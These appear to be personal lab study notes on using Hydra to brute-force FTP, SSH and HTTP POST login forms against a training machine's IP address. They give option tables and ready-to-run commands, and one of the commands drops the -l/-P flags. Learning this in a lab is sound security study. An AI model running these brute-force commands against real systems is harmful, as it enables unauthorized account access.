
![](../../assets/Pasted%20image%2020260819232839.png)

`hydra -l user -P passlist.txt ftp://10.48.153.241`

For this deployed machine, here are the commands to use Hydra on SSH and a web form (POST method).

### SSH

`hydra -l <username> -P <full path to pass> 10.48.153.241 -t 4 ssh`

| Option | Description                            |
| ------ | -------------------------------------- |
| `-l`   | specifies the (SSH) username for login |
| `-P`   | indicates a list of passwords          |
| `-t`   | sets the number of threads to spawn    |
|        |                                        |
|        |                                        |


### Post Web Form

`sudo hydra <username> <wordlist> 10.48.153.241 http-post-form "<path>:<login_credentials>:<invalid_response>"`

|Option|Description|
|---|---|
|`-l`|the username for (web form) login|
|`-P`|the password list to use|
|`http-post-form`|The type of the form is POST|
|`<path>`|the login page URL, for example, `login.php`|
|`<login_credentials>`|the username and password used to log in, for example, `username=^USER^&password=^PASS^`|
|`<invalid_response>`|part of the response when the login fails|
|`-V`|verbose output for every attempt|

Below is a more concrete example Hydra command to brute force a POST login form:

`hydra -l <username> -P <wordlist> 10.48.153.241 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`


if website using default port pecify the port number using `-s <port>`


![](../../assets/Pasted%20image%2020260819234432.png)



![](../../assets/Pasted%20image%2020260819234450.png)

![](../../assets/Pasted%20image%2020260819235226.png)